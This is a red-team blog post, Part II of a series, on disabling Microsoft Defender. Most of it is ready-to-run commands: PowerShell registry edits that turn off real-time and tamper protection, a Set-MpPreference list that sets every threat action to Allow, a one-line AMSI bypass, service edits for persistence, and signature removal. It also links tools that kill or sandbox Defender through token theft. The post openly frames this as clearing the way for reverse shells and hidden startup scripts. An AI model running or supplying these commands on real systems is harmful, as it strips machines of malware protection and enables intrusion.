---
author: "Jann Moon"
title: "Defender Defeated - Part II: Aegis Unbound"
description: "Further Armaments in the eternal war against Microsoft's Persistant Anti-Virus for Offsec Wizards."
tags: ["AV Bypass", "Defender", "Powershell", "Red Team"]
date: 2023-07-10
thumbnail: floral9.jpg
---

In this second chapter on how to overcome the despotic guardian known as Microsoft Defender, lets continue on the chronicle of arcane knowledge and subtle sorcery.  In the last article, I regaled you with tales of frustration and perseverance, sharing the humble beginnings of my journey and described the labyrinthine ways of hiding paths in the shadows, as well as harnessing the very tools bundled within the Defender's arsenal to summon forbidden executables.  

Now, dear reader, let us delve deeper into the intricate tapestry of Defender bypasses, to unearth the secrets needed to disabling its watchful eye.  So gather 'round, fellow seekers of arcane wisdom, as we continue to unravel the ancient scrolls and unlock the gates that stand between us and triumph over Microsoft Defender's steadfast defenses.

## Clandestine Manipulation of Local Group Policy Editor (gpedit.msc)

Hiding things from Defender via setting it to ignore paths is a bit more subtly, but if you'd rather just expunge the lifeforce from it, follow along.  

If "gpedit.msc" is not available, you can run the following to try to install it.

```cmd
C:/ > FOR %F IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%F")
C:/ > FOR %F IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%F")
```

*Requires RDP or VNC Access*

- Run "gpedit.msc", which will open the "Local Group Policy Editor". 
- Browse to  *Computer Configuration* >> *Administrative Templates* >> *Windows Components* >> *Microsoft Defender Antivirus* >> *Real-time Protection* 

- Similarly, you can also set *Turn off Microsoft Defender Antivirus* to *Enabled* in the same section.


### Window's Defender Killing Tools

*DefenderSwitch* by last-byte uses a similar technique of shutting off Defender, though more discretely via usage of the Win32 API.  The code has been updated by APTortellini and is linked below.

[DefenderSwitch by APTortellini on Github](https://github.com/APTortellini/DefenderSwitch)


*StopDefenderService* by dosxuz is a C# tool that uses the token impersonation technique to shut off Defender.  Since Defender's WinDefend process can only be turned off with the privileges of the TrustedInstaller group.  Therefore it steals the token from the TrustedInstaller service and impersonates it - allowing the service to be killed.  

[StopDefenderService by dosxuz](https://github.com/dosxuz/DefenderStop)

*Defeat-Defender* by swagkarma is a batch script that gets rid of the Defender suite eternally.  Thi s includes Windows FireWall
Windows Smart Screen, Firewall, Ransomware Protection and more.

[Defeat-Defender by swagkarma on Github](https://github.com/swagkarna/Defeat-Defender-V1.2.0)

Here's a Powershell script by fiercebrute that also completely removes Defender irreversibly via Set-MpPreference, editing the registry and deleting crucial Defender files.
[fiercebrute gist](https://gist.github.com/fiercebrute/46e0636c0eaf72dcd3df4e280b6792d6)


## Powershell's Registry-Altering Incantations 

To disable most anti-virus features and services via directly changing registry entries, you can use these Powershell commands.  This requires SYSTEM privileges; if not available, use [StopDefenderService by dosxuz](https://github.com/dosxuz/DefenderStop) mentioned above.

```ps
# Kill "Cloud-Delivered Protections" feature
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0

# No more "Automatic Sample submission"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0

# Un-Tamper Un-protection
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
        
# The big one
New-ItemProperty -Path “HKLM:\SOFTWARE\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1

New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
```

Generally, the Defender services can't be stopped, just disabled, therefore they'll return on next restart of the machine.  You could put the following commands into a ".ps1" script that is set to run at startup.  For persistence, this script could be followed by downloading and executing a shell, opening RDP or any preferred method.

```ps
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" -Name Start -Value 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name Start -Value 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Sense" -Name Start -Value 4
```

For your enjoyment, here is a pretty comprehensive list of all the Defender features you probably don't want complicating your reverse shells from executing succesfully.  If you want to use these in a hidden script that runs at startup, make sure to add `-ErrorAction SilentlyContinue` at the end of each line.

```ps
Set-MpPreference -LowThreatDefaultAction Allow 
Set-MpPreference -ModerateThreatDefaultAction Allow 
Set-MpPreference -HighThreatDefaultAction Allow
Set-MpPreference -DisableArchiveScanning 1 
Set-MpPreference -DisableRemovableDriveScanning 1 
Set-MpPreference -DisableBlockAtFirstSeen 1 
Set-MpPreference -DisableBehaviorMonitoring 1 
Set-MpPreference -DisableIntrusionPreventionSystem 1 
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 
Set-MpPreference -DisableScanningNetworkFiles 1
Set-MpPreference -DisableScriptScanning 1 
Set-MpPreference -DisableIOAVProtection 1 
Set-MpPreference -DisableRealtimeMonitoring 1 
Set-MpPreference -DisableRealTimeMonitoring 1
```

Neat way to kill AMSI, for safety and fun.

```ps
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

```

Finally, you can remove the signatures that Defender uses to identify malicious files.  If the computer has internet access, they will be downloaded again, almost immediately, so this is only effective within internal protected VPNs. 

```ps
PS > cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0"
PS > .\MpCmdRun.exe -RemoveDefinitions -All
```
or in cmd:
```cmd
Cmd > "%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Security Token Manipulation, Impersonation and Humiliation

In the spring of 2022, these new techniques emerged that effectively trap antimalware services within a sandbox, cutting off their access from everything else on the computer.  They run at full capacity and keep their fileless environments free of malware.  

Tools like [TokenStomp by MartinIngesen](https://github.com/MartinIngesen/TokenStomp), [KillDefender by pwn1sher](https://github.com/pwn1sher/KillDefender) and [plackyhacker's SandboxDefender](https://github.com/plackyhacker/SandboxDefender) do some very clever and creative things in their code but I'll do my best to summarize the basics.

	1. Enable `SeDebugPrivilege` in the current user's token
	2. Uses Win32 API functions to find Defender's token, then disable all of its privileges
	3. Set Defender's token integrity level to "Untrusted"


[TokenStomp by MartinIngesen](https://github.com/MartinIngesen/TokenStomp)

[KillDefender by pwn1sher](https://github.com/pwn1sher/KillDefender) 

[plackyhacker's SandboxDefender](https://github.com/plackyhacker/SandboxDefender)
